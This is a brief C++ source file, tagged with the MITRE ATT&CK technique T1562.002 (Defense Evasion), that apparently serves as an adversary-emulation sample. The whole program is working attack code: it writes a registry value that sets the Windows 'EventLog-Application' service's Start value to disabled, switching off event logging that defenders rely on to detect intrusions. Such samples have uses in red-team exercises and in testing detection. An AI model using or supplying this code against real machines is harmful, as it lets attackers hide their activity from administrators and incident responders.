// Link      = https://attack.mitre.org/techniques/T1562/002/
// Technique = Impair Defenses: Disable Windows Event Logging
// ID        = T1562.002
// Tactics   = Defense Evasion,

#include <Windows.h>

int main() {
    HKEY hKey;
    DWORD value = 4;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\EventLog-Application", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
    {
        return 1;
    }
    RegSetValueExA(hKey, "Start", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&value), sizeof(value));
    RegCloseKey(hKey);
 
    return 0;
}
